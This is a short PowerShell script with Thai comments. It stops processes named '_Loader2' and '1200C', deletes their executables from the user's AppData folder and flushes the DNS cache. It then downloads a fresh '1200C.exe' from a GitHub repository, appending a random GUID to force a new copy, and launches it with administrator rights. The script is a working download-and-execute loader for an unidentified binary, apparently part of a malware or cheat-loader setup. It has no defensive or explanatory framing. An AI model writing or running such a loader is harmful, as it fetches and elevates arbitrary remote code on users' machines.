# 1. ปิดโปรแกรมที่อาจรันค้างอยู่
Stop-Process -Name "_Loader2" -ErrorAction SilentlyContinue
Stop-Process -Name "1200C" -ErrorAction SilentlyContinue

# 2. ลบไฟล์เก่าทิ้งให้หมด (ทั้งตัวเก่าและตัวใหม่ในเครื่อง)
$oldPath = "$env:APPDATA\_Loader2.exe"
$newPath = "$env:APPDATA\1200C.exe"

if (Test-Path $oldPath) { Remove-Item $oldPath -Force -ErrorAction SilentlyContinue }
if (Test-Path $newPath) { Remove-Item $newPath -Force -ErrorAction SilentlyContinue }

# 3. ล้าง DNS Cache ในเครื่องเผื่อ GitHub ไม่ยอมอัปเดต IP
ipconfig /flushdns

# 4. ตั้งค่า URL ใหม่ (เพิ่ม GUID ท้ายลิ้งก์เพื่อบังคับโหลดใหม่ 100%)
$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/1200C.exe?v=$([guid]::NewGuid())"

# 5. ดาวน์โหลด
try {
    Write-Host "Cleaning old files & Downloading latest Loader..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $newPath
} catch {
    Write-Host "Download Failed!" -ForegroundColor Red
    exit
}

# 6. รันตัวล่าสุดขึ้นมา
if (Test-Path $newPath) {
    Start-Process -FilePath $newPath -Verb RunAs
}
